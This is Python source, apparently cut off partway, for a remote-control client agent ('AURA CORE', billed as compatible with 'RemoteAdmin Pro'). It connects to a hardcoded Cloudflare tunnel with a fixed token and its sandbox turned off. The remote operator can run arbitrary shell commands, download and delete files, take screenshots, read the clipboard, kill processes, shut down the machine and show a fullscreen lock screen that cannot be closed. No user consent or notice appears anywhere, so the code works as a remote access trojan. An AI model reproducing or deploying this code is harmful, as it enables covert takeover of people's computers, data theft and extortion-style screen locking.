"""
AURA CORE - Client Agent
Conecta ao painel admin.py e executa comandos remotos.
Protocolo compatível com admin.py (RemoteAdmin Pro).

Uso: python client3.py

CORREÇÕES DE SCREENSHOT:
  - Substituição de ImageGrab por mss (cross-platform, mais rápido)
  - Fallback robusto: mss -> PIL.ImageGrab -> pyautogui
  - Payload normalizado: sempre JSON com campo "_b64" contendo JPEG em base64
  - Log de diagnóstico detalhado para rastrear falhas
"""

from __future__ import annotations

import base64
import datetime
import fnmatch
import io
import json
import logging
import os
import platform
import shutil
import signal
import socket
import asyncio
import ssl
import websockets
import stat
import struct
import subprocess
import sys
import threading
import time
from pathlib import Path
from typing import Any, Optional

# ===========================================================================
# Configuração — edite antes de rodar
# ===========================================================================
ADMIN_WS_URL: str = "wss://appearing-swimming-throw-prospective.trycloudflare.com"
AUTH_TOKEN: str   = "auracorelabv33333"

RECONNECT_DELAY: float = 10.0
SAFE_MODE: bool        = False
SANDBOX_ROOT: str      = str(Path.home() / "aura_sandbox")

ALLOW_SHELL:      bool = True
ALLOW_FILE_OPS:   bool = True
ALLOW_SCREENSHOT: bool = True
ALLOW_CLIPBOARD:  bool = True
ALLOW_LOCK:       bool = True

SHELL_ALLOWLIST: list = []
MAX_FILE_READ:   int  = 5 * 1024 * 1024    # 5 MB
MAX_PAYLOAD:     int  = 128 * 1024 * 1024  # 128 MB
LOG_PATH:        str  = "aura_client.log"

# ===========================================================================
# Protocolo
# ===========================================================================
HEADER_FORMAT = ">IHI"
HEADER_SIZE   = struct.calcsize(HEADER_FORMAT)
RECV_BUFFER   = 65536

MSG = {
    "AUTH_HELLO":   0x0001,
    "AUTH_OK":      0x0002,
    "AUTH_ERROR":   0x0003,
    "HEARTBEAT":    0x0010,
    "HEARTBEAT_ACK":0x0011,
    "SYS_INFO_REQ": 0x0020,
    "SYS_INFO_RES": 0x0021,
    "METRICS_REQ":  0x0022,
    "METRICS_RES":  0x0023,
    "PROC_LIST_REQ":    0x0030,
    "PROC_LIST_RES":    0x0031,
    "PROC_KILL_REQ":    0x0032,
    "PROC_KILL_RES":    0x0033,
    "PROC_SUSPEND_REQ": 0x0034,
    "PROC_SUSPEND_RES": 0x0035,
    "PROC_RESUME_REQ":  0x0036,
    "PROC_RESUME_RES":  0x0037,
    "FILE_LIST_REQ":    0x0040,
    "FILE_LIST_RES":    0x0041,
    "FILE_DOWNLOAD_REQ":0x0042,
    "FILE_DOWNLOAD_RES":0x0043,
    "FILE_UPLOAD_REQ":  0x0044,
    "FILE_UPLOAD_RES":  0x0045,
    "FILE_DELETE_REQ":  0x0046,
    "FILE_DELETE_RES":  0x0047,
    "FILE_RENAME_REQ":  0x0048,
    "FILE_RENAME_RES":  0x0049,
    "FILE_MKDIR_REQ":   0x004A,
    "FILE_MKDIR_RES":   0x004B,
    "FILE_READ_REQ":    0x004C,
    "FILE_READ_RES":    0x004D,
    "FILE_SEARCH_REQ":  0x004E,
    "FILE_SEARCH_RES":  0x004F,
    "FILE_MOVE_REQ":    0x0050,
    "FILE_MOVE_RES":    0x0051,
    "TERM_CMD_REQ": 0x0060,
    "TERM_CMD_RES": 0x0061,
    "TERM_STREAM":  0x0062,
    "SCREEN_REQ":   0x0070,
    "SCREEN_RES":   0x0071,
    "LOCK_REQ":     0x0080,
    "LOCK_RES":     0x0081,
    "UNLOCK_REQ":   0x0082,
    "UNLOCK_RES":   0x0083,
    "NET_INFO_REQ": 0x0090,
    "NET_INFO_RES": 0x0091,
    "NET_PING_REQ": 0x0092,
    "NET_PING_RES": 0x0093,
    "LOG_REQ":      0x00A0,
    "LOG_RES":      0x00A1,
    "LOG_STREAM":   0x00A2,
    "ACTION_RESTART_AGENT":      0x00B0,
    "ACTION_STOP_AGENT":         0x00B1,
    "ACTION_CLIPBOARD_GET":      0x00B2,
    "ACTION_CLIPBOARD_RES":      0x00B3,
    "ACTION_CLIPBOARD_SET":      0x00B4,
    "ACTION_CLIPBOARD_SET_RES":  0x00B5,
    "ACTION_POPUP_MSG":          0x00B6,
    "ACTION_POPUP_RES":          0x00B7,
    "ACTION_OPEN_URL":           0x00B8,
    "ACTION_OPEN_URL_RES":       0x00B9,
    "ACTION_SHUTDOWN":           0x00BA,
    "ACTION_SHUTDOWN_RES":       0x00BB,
    "ACTION_REBOOT":             0x00BC,
    "ACTION_REBOOT_RES":         0x00BD,
    "GENERIC_ERROR": 0xFFFF,
}
MSG_NAMES = {v: k for k, v in MSG.items()}

# ===========================================================================
# Logging
# ===========================================================================
def build_logger() -> logging.Logger:
    logger = logging.getLogger("aura.client")
    logger.setLevel(logging.DEBUG)
    fmt = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s")
    fh = logging.FileHandler(LOG_PATH, encoding="utf-8")
    fh.setFormatter(fmt)
    ch = logging.StreamHandler(sys.stdout)
    ch.setFormatter(fmt)
    logger.addHandler(fh)
    logger.addHandler(ch)
    return logger

log = build_logger()

# ===========================================================================
# Imports opcionais — com diagnóstico detalhado
# ===========================================================================
try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False
    log.warning("psutil não disponível — métricas limitadas")

# ── SCREENSHOT: tentativa em ordem de prioridade ──────────────────────────
HAS_MSS = False
HAS_PIL_GRAB = False
HAS_PYAUTOGUI_SS = False

try:
    import mss as _mss_module
    HAS_MSS = True
    log.info("Screenshot backend: mss (primário)")
except ImportError:
    log.warning("mss não disponível")

if not HAS_MSS:
    try:
        from PIL import ImageGrab as _ImageGrab
        HAS_PIL_GRAB = True
        log.info("Screenshot backend: PIL.ImageGrab (fallback 1)")
    except ImportError:
        log.warning("PIL.ImageGrab não disponível")

if not HAS_MSS and not HAS_PIL_GRAB:
    try:
        import pyautogui as _pyautogui_ss
        HAS_PYAUTOGUI_SS = True
        log.info("Screenshot backend: pyautogui (fallback 2)")
    except ImportError:
        log.warning("pyautogui screenshot não disponível")

HAS_SCREENSHOT = HAS_MSS or HAS_PIL_GRAB or HAS_PYAUTOGUI_SS
if not HAS_SCREENSHOT:
    log.error("NENHUM backend de screenshot disponível! "
              "Instale: pip install mss  OU  pip install Pillow")

try:
    import tkinter as tk
    from tkinter import messagebox
    HAS_TK = True
except ImportError:
    HAS_TK = False
    log.warning("tkinter não disponível")

# ===========================================================================
# Helpers de protocolo
# ===========================================================================
def encode_message(msg_type: int, payload: bytes = b"") -> bytes:
    length = len(payload)
    hi = (length >> 32) & 0xFFFF
    lo = length & 0xFFFFFFFF
    header = struct.pack(HEADER_FORMAT, msg_type, hi, lo)
    return header + payload

def encode_json(msg_type: int, data: dict) -> bytes:
    return encode_message(msg_type, json.dumps(data, default=str).encode("utf-8"))

def recv_exactly(sock: socket.socket, n: int) -> bytes:
    buf = bytearray()
    while len(buf) < n:
        chunk = sock.recv(min(RECV_BUFFER, n - len(buf)))
        if not chunk:
            raise ConnectionError("Conexão encerrada pelo peer")
        buf.extend(chunk)
    return bytes(buf)

def recv_message(sock: socket.socket):
    header = recv_exactly(sock, HEADER_SIZE)
    msg_type, hi, lo = struct.unpack(HEADER_FORMAT, header)
    payload_len = (hi << 32) | lo
    if payload_len > MAX_PAYLOAD:
        raise ValueError(f"Payload muito grande: {payload_len}")
    payload = recv_exactly(sock, payload_len) if payload_len else b""
    return msg_type, payload

def decode_json(payload: bytes) -> dict:
    return json.loads(payload.decode("utf-8"))

# ===========================================================================
# Path seguro
# ===========================================================================
def safe_path(path_str: str) -> Path:
    p = Path(path_str).expanduser().resolve()
    if SAFE_MODE:
        sandbox = Path(SANDBOX_ROOT).resolve()
        sandbox.mkdir(parents=True, exist_ok=True)
        if not str(p).startswith(str(sandbox)):
            raise PermissionError(f"SAFE_MODE: '{p}' fora do sandbox '{sandbox}'")
    return p

def fmt_size(n: int) -> str:
    for u in ["B", "KB", "MB", "GB"]:
        if n < 1024:
            return f"{n:.0f} {u}"
        n /= 1024
    return f"{n:.2f} TB"

def file_perms(p: Path) -> str:
    try:
        return stat.filemode(p.stat().st_mode)
    except Exception:
        return "?"

def file_mtime(p: Path) -> str:
    try:
        return datetime.datetime.fromtimestamp(p.stat().st_mtime).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return "?"

# ===========================================================================
# Coleta de informações do sistema
# ===========================================================================
def collect_sys_info() -> dict:
    info: dict[str, Any] = {
        "hostname":       socket.gethostname(),
        "os":             platform.system(),
        "os_version":     platform.version(),
        "arch":           platform.machine(),
        "python_version": platform.python_version(),
        "ip":             get_local_ip(),
        "cpu_model":      platform.processor() or "—",
        "cpu_physical":   os.cpu_count() or 1,
        "cpu_logical":    os.cpu_count() or 1,
        "boot_time":      "—",
        "ram_total":      0,
        "mac":            get_mac(),
    }
    if HAS_PSUTIL:
        try:
            mem = psutil.virtual_memory()
            info["ram_total"]    = mem.total
            info["cpu_physical"] = psutil.cpu_count(logical=False) or 1
            info["cpu_logical"]  = psutil.cpu_count(logical=True) or 1
            info["boot_time"]    = datetime.datetime.fromtimestamp(
                psutil.boot_time()).strftime("%Y-%m-%d %H:%M")
        except Exception:
            pass
    return info

def collect_metrics() -> dict:
    metrics: dict[str, Any] = {
        "cpu": 0.0, "ram_percent": 0.0, "ram_used": 0, "ram_total": 0,
        "disk_percent": 0.0, "disk_used": 0, "disk_total": 0,
        "process_count": 0, "uptime": 0,
    }
    if HAS_PSUTIL:
        try:
            metrics["cpu"]           = psutil.cpu_percent(interval=0.1)
            mem                      = psutil.virtual_memory()
            metrics["ram_percent"]   = mem.percent
            metrics["ram_used"]      = mem.used
            metrics["ram_total"]     = mem.total
            disk                     = psutil.disk_usage("/")
            metrics["disk_percent"]  = disk.percent
            metrics["disk_used"]     = disk.used
            metrics["disk_total"]    = disk.total
            metrics["process_count"] = len(psutil.pids())
            metrics["uptime"]        = time.time() - psutil.boot_time()
        except Exception:
            pass
    return metrics

def get_local_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def get_mac() -> str:
    try:
        import uuid
        mac = uuid.getnode()
        return ":".join(f"{(mac >> (i*8)) & 0xff:02x}" for i in range(5, -1, -1))
    except Exception:
        return "—"

# ===========================================================================
# Gerenciador de processos
# ===========================================================================
def list_processes() -> list:
    if not HAS_PSUTIL:
        return [{"pid": os.getpid(), "name": "aura_client", "status": "running",
                 "cpu_percent": 0, "memory_mb": 0, "username": "—", "num_threads": 1}]
    procs = []
    for p in psutil.process_iter(["pid", "name", "status", "cpu_percent",
                                   "memory_info", "username", "num_threads"]):
        try:
            i = p.info
            procs.append({
                "pid":         i["pid"],
                "name":        i["name"] or "—",
                "status":      i["status"] or "—",
                "cpu_percent": round(i["cpu_percent"] or 0, 1),
                "memory_mb":   round((i["memory_info"].rss if i["memory_info"] else 0) / (1024**2), 1),
                "username":    i["username"] or "—",
                "num_threads": i["num_threads"] or 0,
            })
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    return procs

def kill_process(pid: int) -> dict:
    if not HAS_PSUTIL:
        return {"ok": False, "msg": "psutil não disponível"}
    try:
        p = psutil.Process(pid)
        name = p.name()
        p.terminate()
        return {"ok": True, "msg": f"PID {pid} ({name}) encerrado"}
    except psutil.NoSuchProcess:
        return {"ok": False, "msg": f"PID {pid} não existe"}
    except psutil.AccessDenied:
        return {"ok": False, "msg": f"Acesso negado ao PID {pid}"}

def suspend_process(pid: int) -> dict:
    if not HAS_PSUTIL:
        return {"ok": False, "msg": "psutil não disponível"}
    try:
        psutil.Process(pid).suspend()
        return {"ok": True, "msg": f"PID {pid} suspenso"}
    except Exception as e:
        return {"ok": False, "msg": str(e)}

def resume_process(pid: int) -> dict:
    if not HAS_PSUTIL:
        return {"ok": False, "msg": "psutil não disponível"}
    try:
        psutil.Process(pid).resume()
        return {"ok": True, "msg": f"PID {pid} retomado"}
    except Exception as e:
        return {"ok": False, "msg": str(e)}

# ===========================================================================
# Operações de arquivo
# ===========================================================================
def file_list(path_str: str) -> dict:
    p = safe_path(path_str)
    if not p.exists():
        return {"ok": False, "msg": f"Caminho não existe: {p}"}
    if not p.is_dir():
        return {"ok": False, "msg": f"Não é um diretório: {p}"}
    entries = []
    try:
        for item in sorted(p.iterdir(), key=lambda x: (not x.is_dir(), x.name.lower())):
            try:
                s = item.stat()
                entries.append({
                    "name":        item.name,
                    "is_dir":      item.is_dir(),
                    "size":        s.st_size,
                    "permissions": file_perms(item),
                    "modified":    file_mtime(item),
                    "full_path":   str(item),
                })
            except Exception:
                pass
    except PermissionError as e:
        return {"ok": False, "msg": str(e)}
    return {"ok": True, "path": str(p), "entries": entries}

def file_read(path_str: str) -> dict:
    try:
        p = safe_path(path_str)
        if not p.is_file():
            return {"ok": False, "msg": f"Não é um arquivo: {p}"}
        size = p.stat().st_size
        if size > MAX_FILE_READ:
            return {"ok": False, "msg": f"Arquivo muito grande ({fmt_size(size)})"}
        content = p.read_text(encoding="utf-8", errors="replace")
        return {"ok": True, "filename": p.name, "content": content}
    except Exception as e:
        return {"ok": False, "msg": str(e)}

def file_download(path_str: str) -> tuple:
    try:
        p = safe_path(path_str)
        if not p.is_file():
            return None, f"Não é um arquivo: {p}"
        data = p.read_bytes()
        return data, p.name
    except Exception as e:
        return None, str(e)

def file_upload(dest_path: str, filename: str, data: bytes) -> dict:
    try:
        dest_dir = safe_path(dest_path)
        dest_dir.mkdir(parents=True, exist_ok=True)
        dest_file = dest_dir / filename
        dest_file.write_bytes(data)
        return {"ok": True, "msg": f"Arquivo salvo: {dest_file}"}
    except Exception as e:
        return {"ok": False, "msg": str(e)}

def file_delete(path_str: str) -> dict:
    try:
        p = safe_path(path_str)
        if not p.exists():
            return {"ok": False, "msg": f"Não encontrado: {p}"}
        if p.is_dir():
            shutil.rmtree(p)
        else:
            p.unlink()
        return {"ok": True, "msg": f"Deletado: {p}"}
    except Exception as e:
        return {"ok": False, "msg": str(e)}

def file_rename(old_path: str, new_name: str) -> dict:
    try:
        src = safe_path(old_path)
        dst = src.parent / new_name
        src.rename(dst)
        return {"ok": True, "msg": f"Renomeado para {new_name}"}
    except Exception as e:
        return {"ok": False, "msg": str(e)}

def file_mkdir(path_str: str, name: str) -> dict:
    try:
        parent = safe_path(path_str)
        new_dir = parent / name
        new_dir.mkdir(parents=True, exist_ok=True)
        return {"ok": True, "msg": f"Pasta criada: {new_dir}"}
    except Exception as e:
        return {"ok": False, "msg": str(e)}

def file_search(base_path: str, query: str, max_results: int = 500) -> dict:
    try:
        root = safe_path(base_path)
        results = []
        for item in root.rglob("*"):
            if fnmatch.fnmatch(item.name.lower(), f"*{query.lower()}*"):
                results.append(str(item))
                if len(results) >= max_results:
                    break
        return {"ok": True, "results": results}
    except Exception as e:
        return {"ok": False, "results": [], "msg": str(e)}

def file_move(src_str: str, dst_str: str) -> dict:
    try:
        src = safe_path(src_str)
        dst = safe_path(dst_str)
        shutil.move(str(src), str(dst))
        return {"ok": True, "msg": f"Movido para {dst}"}
    except Exception as e:
        return {"ok": False, "msg": str(e)}

# ===========================================================================
# Executor de comandos shell
# ===========================================================================
def run_command(cmd: str, timeout: float = 30.0) -> dict:
    if not ALLOW_SHELL:
        return {"stdout": "", "stderr": "Shell desabilitado.", "returncode": -1, "duration_ms": 0}
    log.warning(f"[AUDIT] Shell exec: {cmd!r}")
    start = time.time()
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True,
            timeout=timeout, cwd=str(Path.home()),
            encoding="utf-8", errors="replace"
        )
        dur = round((time.time() - start) * 1000)
        return {"stdout": result.stdout, "stderr": result.stderr,
                "returncode": result.returncode, "duration_ms": dur}
    except subprocess.TimeoutExpired:
        return {"stdout": "", "stderr": f"Timeout após {timeout}s",
                "returncode": -1, "duration_ms": int(timeout * 1000)}
    except Exception as e:
        return {"stdout": "", "stderr": str(e), "returncode": -1, "duration_ms": 0}

# ===========================================================================
# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  SCREENSHOT — NÚCLEO CORRIGIDO                                          ║
# ║                                                                          ║
# ║  PROBLEMA ORIGINAL:                                                      ║
# ║    • PIL.ImageGrab falha em Linux (sem display X11 virtual)             ║
# ║    • O payload enviado ao admin era inconsistente (às vezes bytes        ║
# ║      puros, às vezes JSON), causando falha no parse do lado admin       ║
# ║                                                                          ║
# ║  SOLUÇÃO:                                                                ║
# ║    1. Backend primário: mss (cross-platform, sem dependência de GUI)    ║
# ║    2. Fallbacks: PIL.ImageGrab → pyautogui.screenshot                   ║
# ║    3. Payload SEMPRE JSON com campo "_b64" = JPEG em base64             ║
# ║       Formato: {"ok": true, "_b64": "<base64-jpeg>", "size": N}         ║
# ║    4. Log detalhado em cada etapa para diagnóstico                      ║
# ╚══════════════════════════════════════════════════════════════════════════╝
# ===========================================================================

def _capture_with_mss(quality: int) -> Optional[bytes]:
    """Captura tela usando mss — funciona em Windows, macOS e Linux."""
    try:
        import mss
        import mss.tools
        from PIL import Image  # mss precisa de PIL apenas para conversão

        with mss.mss() as sct:
            # Monitor 1 = monitor principal (0 = todos combinados)
            monitor = sct.monitors[1]
            log.debug(f"[Screenshot/mss] Capturando monitor: {monitor}")
            raw = sct.grab(monitor)
            # mss retorna BGRA; converte para RGB antes de salvar como JPEG
            img = Image.frombytes("RGB", raw.size, raw.bgra, "raw", "BGRX")
            buf = io.BytesIO()
            img.save(buf, format="JPEG", quality=quality, optimize=False)
            jpeg_bytes = buf.getvalue()
            log.info(f"[Screenshot/mss] OK — {len(jpeg_bytes)} bytes, quality={quality}")
            return jpeg_bytes
    except Exception as e:
        log.warning(f"[Screenshot/mss] Falhou: {e}")
        return None


def _capture_with_pil(quality: int) -> Optional[bytes]:
    """Fallback: PIL.ImageGrab — funciona bem no Windows/macOS."""
    try:
        from PIL import ImageGrab, Image
        img = ImageGrab.grab()
        # Garante RGB (sem canal alpha, JPEG não suporta)
        img = img.convert("RGB")
        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=quality, optimize=False)
        jpeg_bytes = buf.getvalue()
        log.info(f"[Screenshot/PIL] OK — {len(jpeg_bytes)} bytes, quality={quality}")
        return jpeg_bytes
    except Exception as e:
        log.warning(f"[Screenshot/PIL] Falhou: {e}")
        return None


def _capture_with_pyautogui(quality: int) -> Optional[bytes]:
    """Fallback 2: pyautogui.screenshot."""
    try:
        import pyautogui
        from PIL import Image
        img = pyautogui.screenshot()
        img = img.convert("RGB")
        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=quality, optimize=False)
        jpeg_bytes = buf.getvalue()
        log.info(f"[Screenshot/pyautogui] OK — {len(jpeg_bytes)} bytes, quality={quality}")
        return jpeg_bytes
    except Exception as e:
        log.warning(f"[Screenshot/pyautogui] Falhou: {e}")
        return None


def take_screenshot(quality: int = 70) -> Optional[bytes]:
    """
    Captura a tela e retorna bytes JPEG.
    
    Tenta os backends em ordem: mss → PIL.ImageGrab → pyautogui.
    
    RETORNA:
        bytes JPEG se bem-sucedido, None se todos os backends falharam.
    
    QUALIDADE:
        30  = baixa  (~50-150 KB) — para modo watch rápido
        60  = média  (~150-400 KB) — padrão
        90  = alta   (~400-800 KB) — para snapshot único
    """
    if not ALLOW_SCREENSHOT:
        log.warning("[Screenshot] ALLOW_SCREENSHOT=False, captura bloqueada")
        return None

    quality = max(10, min(95, quality))  # Clamp seguro

    # Tenta backend por backend
    jpeg = None
    if HAS_MSS:
        jpeg = _capture_with_mss(quality)
    if jpeg is None and HAS_PIL_GRAB:
        jpeg = _capture_with_pil(quality)
    if jpeg is None and HAS_PYAUTOGUI_SS:
        jpeg = _capture_with_pyautogui(quality)

    if jpeg is None:
        log.error("[Screenshot] TODOS os backends falharam. "
                  "Instale: pip install mss Pillow")
    return jpeg


def build_screen_response(quality: int = 70) -> dict:
    """
    ╔══════════════════════════════════════════════════════════════╗
    ║  Constrói o payload JSON de resposta ao SCREEN_REQ          ║
    ║                                                              ║
    ║  FORMATO PADRONIZADO (compatível com admin._handle_screen):  ║
    ║    {                                                         ║
    ║      "ok":   true | false,                                  ║
    ║      "_b64": "<string base64 do JPEG>",   # se ok=true      ║
    ║      "size": <int bytes originais>,        # se ok=true      ║
    ║      "msg":  "<motivo>",                   # se ok=false     ║
    ║      "backend": "mss|pil|pyautogui"        # diagnóstico    ║
    ║    }                                                         ║
    ╚══════════════════════════════════════════════════════════════╝
    """
    jpeg = take_screenshot(quality)
    if jpeg is None:
        return {"ok": False, "msg": "Nenhum backend de screenshot disponível"}

    b64_str = base64.b64encode(jpeg).decode("ascii")
    backend = ("mss" if HAS_MSS else
               "pil" if HAS_PIL_GRAB else
               "pyautogui" if HAS_PYAUTOGUI_SS else "none")
    return {
        "ok":      True,
        "_b64":    b64_str,
        "size":    len(jpeg),
        "backend": backend,
    }

# ===========================================================================
# Clipboard
# ===========================================================================
def clipboard_get() -> str:
    if not ALLOW_CLIPBOARD or not HAS_TK:
        return ""
    try:
        root = tk.Tk()
        root.withdraw()
        text = root.clipboard_get()
        root.destroy()
        return text
    except Exception:
        return ""

def clipboard_set(text: str) -> bool:
    if not ALLOW_CLIPBOARD or not HAS_TK:
        return False
    try:
        root = tk.Tk()
        root.withdraw()
        root.clipboard_clear()
        root.clipboard_append(text)
        root.update()
        root.after(500, root.destroy)
        root.mainloop()
        return True
    except Exception:
        return False

def show_popup(title: str, body: str) -> None:
    if HAS_TK:
        def _show():
            root = tk.Tk()
            root.withdraw()
            messagebox.showinfo(title, body)
            root.destroy()
        threading.Thread(target=_show, daemon=True).start()
    else:
        print(f"\n{'='*60}\n{title}\n{body}\n{'='*60}\n")

def open_url(url: str) -> None:
    import webbrowser
    webbrowser.open(url)

# ===========================================================================
# Informações de rede
# ===========================================================================
def collect_net_info() -> dict:
    info: dict[str, Any] = {
        "hostname":   socket.gethostname(),
        "primary_ip": get_local_ip(),
        "interfaces": [],
        "dns":        [],
        "routes":     [],
    }
    if HAS_PSUTIL:
        try:
            addrs   = psutil.net_if_addrs()
            stats   = psutil.net_if_stats()
            counters = psutil.net_io_counters(pernic=True)
            for iface, addr_list in addrs.items():
                for addr in addr_list:
                    if addr.family == socket.AF_INET:
                        c  = counters.get(iface)
                        st = stats.get(iface)
                        info["interfaces"].append({
                            "name":       iface,
                            "ip":         addr.address,
                            "netmask":    addr.netmask or "",
                            "mac":        _get_mac_for_iface(iface, addrs),
                            "up":         st.isup if st else False,
                            "bytes_recv": c.bytes_recv if c else 0,
                            "bytes_sent": c.bytes_sent if c else 0,
                        })
        except Exception as e:
            log.error(f"net_info erro: {e}")
    return info

def _get_mac_for_iface(iface: str, addrs: dict) -> str:
    AF_LINK = getattr(socket, "AF_LINK", 17)
    for a in addrs.get(iface, []):
        if a.family == AF_LINK:
            return a.address
    return ""

def ping_host(host: str) -> dict:
    param = "-n" if platform.system().lower() == "windows" else "-c"
    try:
        start = time.time()
        r = subprocess.run(["ping", param, "1", host],
                           capture_output=True, text=True, timeout=5)
        rtt = round((time.time() - start) * 1000, 1)
        return {"alive": r.returncode == 0, "rtt_ms": rtt, "target": host}
    except subprocess.TimeoutExpired:
        return {"alive": False, "rtt_ms": -1, "target": host}
    except Exception as e:
        return {"alive": False, "rtt_ms": -1, "target": host, "error": str(e)}

# ===========================================================================
# XOR / decrypt
# ===========================================================================
def xor_decrypt(data: bytes, key: str) -> str:
    key_bytes = key.encode("utf-8")
    return bytes(b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)).decode("utf-8", errors="replace")

def decrypt_password(encrypted_b64: str) -> str:
    try:
        data = base64.b64decode(encrypted_b64)
        return xor_decrypt(data, AUTH_TOKEN[:16])
    except Exception:
        return encrypted_b64

# ===========================================================================
# Lock de tela (tkinter)
# ===========================================================================
class ScreenLock:
    def __init__(self):
        self._active    = False
        self._password  = ""
        self._thread: Optional[threading.Thread] = None
        self._stop_event = threading.Event()
        self._root      = None
        self._notify_fn = None

    def set_notify(self, fn) -> None:
        self._notify_fn = fn

    def lock(self, password: str, message: str) -> bool:
        if self._active or not HAS_TK:
            return False
        self._password = password
        self._stop_event.clear()
        self._thread = threading.Thread(target=self._show_overlay,
                                        args=(message,), daemon=True)
        self._thread.start()
        return True

    def unlock(self) -> bool:
        self._stop_event.set()
        if self._root:
            try:
                self._root.after(0, self._root.destroy)
            except Exception:
                pass
        self._active = False
        return True

    def _show_overlay(self, message: str) -> None:
        self._active = True
        try:
            root = tk.Tk()
            self._root = root
            root.title("AURA CORE - Bloqueado")
            root.attributes("-fullscreen", True)
            root.attributes("-topmost", True)
            root.configure(bg="#0D1117")
            root.protocol("WM_DELETE_WINDOW", lambda: None)

            frame = tk.Frame(root, bg="#0D1117")
            frame.place(relx=0.5, rely=0.5, anchor="center")

            tk.Label(frame, text="🔒 TELA BLOQUEADA", font=("Segoe UI", 22, "bold"),
                     fg="#388BFD", bg="#0D1117").pack(pady=(0, 12))
            tk.Label(frame, text=message, font=("Segoe UI", 14),
                     fg="#E6EDF3", bg="#0D1117", wraplength=700).pack(pady=(0, 24))

            key_var = tk.StringVar()
            entry = tk.Entry(frame, textvariable=key_var, show="*",
                             font=("Consolas", 14), width=24,
                             bg="#1C2333", fg="#E6EDF3", insertbackground="#E6EDF3",
                             relief="flat", bd=4)
            entry.pack(pady=8)
            status_lbl = tk.Label(frame, text="", font=("Segoe UI", 11), bg="#0D1117")
            status_lbl.pack()

            def attempt():
                if key_var.get().strip() == self._password:
                    self._active = False
                    # Notifica o admin com campo "by_user": True para distinguir
                    # desbloqueio feito pelo próprio client do desbloqueio remoto
                    if self._notify_fn:
                        try:
                            self._notify_fn(
                                MSG["UNLOCK_RES"],
                                json.dumps({
                                    "ok":     True,
                                    "msg":    "Desbloqueado pelo usuário na máquina remota",
                                    "by_user": True
                                }).encode()
                            )
                        except Exception as e:
                            log.error(f"[ScreenLock] Erro ao notificar admin: {e}")
                    root.after(300, root.destroy)
                else:
                    status_lbl.config(text="Senha incorreta.", fg="#F85149")
                    key_var.set("")

            tk.Button(frame, text="Desbloquear", command=attempt,
                      font=("Segoe UI", 12, "bold"),
                      bg="#1C2333", fg="#E6EDF3", relief="flat",
                      padx=24, pady=8).pack(pady=8)
            root.bind("<Return>", lambda e: attempt())

            def poll():
                if self._stop_event.is_set():
                    root.destroy()
                    return
                root.after(500, poll)
            root.after(500, poll)
            root.mainloop()
        except Exception as e:
            log.error(f"Lock overlay erro: {e}")
        finally:
            self._active = False
            self._root   = None

_screen_lock = ScreenLock()

# ===========================================================================
# Leitura de logs
# ===========================================================================
def read_logs(level: str = "DEBUG", limit: int = 500) -> list:
    level_order = {"DEBUG": 0, "INFO": 1, "WARNING": 2, "ERROR": 3}
    min_lv = level_order.get(level.upper(), 0)
    entries = []
    try:
        with open(LOG_PATH, encoding="utf-8", errors="replace") as f:
            for line in f.readlines()[-limit * 2:]:
                line = line.rstrip()
                lv = "INFO"
                for l in ["DEBUG", "INFO", "WARNING", "ERROR"]:
                    if f"[{l}]" in line:
                        lv = l
                        break
                if level_order.get(lv, 0) >= min_lv:
                    entries.append({"level": lv, "msg": line, "ts": ""})
        return entries[-limit:]
    except Exception:
        return []

# ===========================================================================
# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  DISPATCHER — ponto central de tratamento de comandos                   ║
# ║                                                                          ║
# ║  SCREENSHOT CORRIGIDO:                                                   ║
# ║    Antes: enviava payload misto (às vezes bytes, às vezes JSON parcial) ║
# ║    Agora: SEMPRE envia JSON com {"ok": ..., "_b64": ...}                ║
# ╚══════════════════════════════════════════════════════════════════════════╝
# ===========================================================================
class Dispatcher:
    def __init__(self, send_fn):
        self._send = send_fn
        _screen_lock.set_notify(send_fn)

    def handle(self, msg_type: int, payload: bytes) -> None:
        name = MSG_NAMES.get(msg_type, f"0x{msg_type:04X}")
        log.debug(f"Recebido: {name} ({len(payload)} bytes)")

        try:
            if msg_type == MSG["HEARTBEAT"]:
                self._send(MSG["HEARTBEAT_ACK"], b"")

            elif msg_type == MSG["SYS_INFO_REQ"]:
                self._send(MSG["SYS_INFO_RES"],
                           json.dumps(collect_sys_info(), default=str).encode())

            elif msg_type == MSG["METRICS_REQ"]:
                self._send(MSG["METRICS_RES"],
                           json.dumps(collect_metrics(), default=str).encode())

            elif msg_type == MSG["PROC_LIST_REQ"]:
                self._send(MSG["PROC_LIST_RES"],
                           json.dumps({"processes": list_processes()}).encode())

            elif msg_type == MSG["PROC_KILL_REQ"]:
                d = decode_json(payload)
                self._send(MSG["PROC_KILL_RES"],
                           json.dumps(kill_process(int(d.get("pid", 0)))).encode())

            elif msg_type == MSG["PROC_SUSPEND_REQ"]:
                d = decode_json(payload)
                self._send(MSG["PROC_SUSPEND_RES"],
                           json.dumps(suspend_process(int(d.get("pid", 0)))).encode())

            elif msg_type == MSG["PROC_RESUME_REQ"]:
                d = decode_json(payload)
                self._send(MSG["PROC_RESUME_RES"],
                           json.dumps(resume_process(int(d.get("pid", 0)))).encode())

            elif msg_type == MSG["FILE_LIST_REQ"]:
                d = decode_json(payload)
                res = file_list(d.get("path", str(Path.home())))
                self._send(MSG["FILE_LIST_RES"], json.dumps(res, default=str).encode())

            elif msg_type == MSG["FILE_READ_REQ"]:
                d = decode_json(payload)
                res = file_read(d.get("path", ""))
                meta = json.dumps({"filename": res.get("filename", ""), "ok": res.get("ok", False)}).encode()
                meta_padded = meta.ljust(256, b"\x00")[:256]
                content = res.get("content", res.get("msg", "")).encode("utf-8")
                self._send(MSG["FILE_READ_RES"], meta_padded + content)

            elif msg_type == MSG["FILE_DOWNLOAD_REQ"]:
                d = decode_json(payload)
                data, name_or_err = file_download(d.get("path", ""))
                if data is None:
                    self._send(MSG["GENERIC_ERROR"],
                               json.dumps({"ok": False, "msg": name_or_err}).encode())
                else:
